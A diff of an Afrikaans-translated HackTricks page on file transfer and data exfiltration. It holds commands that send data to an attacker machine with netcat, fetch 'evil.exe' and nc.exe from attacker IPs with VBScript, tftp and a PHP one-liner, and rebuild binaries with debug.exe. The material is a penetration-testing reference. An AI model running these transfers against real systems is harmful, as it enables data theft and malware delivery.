@@ -10,13 +10,13 @@ Ander maniere om HackTricks te ondersteun:
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -170,7 +170,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb-aandeel **met behulp van samba**:
+Of skep 'n smb-deel **met behulp van samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,15 +187,15 @@ service smbd restart
 ```
 ### Exfiltration
 
-Exfiltration is the unauthorized transfer of data from a target system. Once an attacker gains access to a system, they need to find a way to exfiltrate the data they are after. There are several methods that can be used to exfiltrate data from a compromised system. Some common exfiltration methods include:
+Exfiltration is the unauthorized transfer of data from a target system. Once an attacker gains access to a system, they need to find a way to exfiltrate the data they are after. There are various methods to exfiltrate data from a compromised system, including:
 
 - **Email**: Attackers can send sensitive data as email attachments to external email accounts.
-- **FTP**: File Transfer Protocol (FTP) can be used to transfer files from the compromised system to an external server controlled by the attacker.
-- **DNS**: Attackers can encode sensitive data into DNS queries and exfiltrate it to their own DNS server.
-- **HTTP/HTTPS**: Attackers can use HTTP or HTTPS to exfiltrate data by sending it to a web server under their control.
-- **Cloud Storage**: Attackers can upload sensitive data to cloud storage services such as Dropbox or Google Drive.
+- **FTP**: File Transfer Protocol can be used to transfer files from the compromised system to an external server controlled by the attacker.
+- **DNS**: Attackers can encode sensitive data into DNS queries and exfiltrate it through DNS requests.
+- **Web**: Data can be exfiltrated by encoding it into web requests or by uploading it to a web server.
+- **Cloud Storage**: Attackers can use cloud storage services to store and exfiltrate data from the compromised system.
 
-It is important for defenders to monitor network traffic for any signs of data exfiltration and to implement controls to prevent unauthorized data transfers.
+It is essential for organizations to monitor and control outbound network traffic to detect and prevent data exfiltration attempts.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -221,7 +221,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 
 ### Netcat
 
-Netcat is a versatile networking utility that can be used for exfiltration. It can create connections to remote hosts, listen for incoming connections, and transfer data between systems. Netcat can be used to exfiltrate data over various protocols such as TCP or UDP.
+Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used as a simple chat client as well.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -288,15 +288,13 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laai 'n lêer af met 'n PHP eenlynige kode:
+Laai 'n lêer af met 'n PHP eenlynstuk:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-### VBScript
-
-VBScript is a scripting language that is often used by attackers to execute malicious code on Windows systems. Attackers can use VBScript for exfiltration by writing scripts that collect sensitive data and send it to an external server. This technique is commonly used in phishing attacks to steal credentials or other valuable information.
+VBScript is 'n skripsie taal wat deur Microsoft ontwikkel is en dikwels gebruik word vir Windows-gebaseerde skripsies en automatiseringstake. VBScript kan gebruik word vir die uitvoer van data exfiltration deur die gebruik van HTTP-aanvrae na 'n eksterne bediener. Hierdie tegniek kan gebruik word om gesteelde data van 'n geteikenrekenaar na 'n aanvaller se bediener te stuur.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -334,7 +332,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program bied nie net die vermoë om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
+Die `debug.exe` program maak dit nie net moontlik om binêre lêers te inspekteer nie, maar het ook die **vermoë om hulle vanaf heks te herbou**. Dit beteken dat deur 'n heks van 'n binêre lêer te voorsien, `debug.exe` die binêre lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -351,21 +349,21 @@ Dan kopieer en plak die teks in die Windows-skootrekenaar en 'n lêer genaamd nc
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 ```
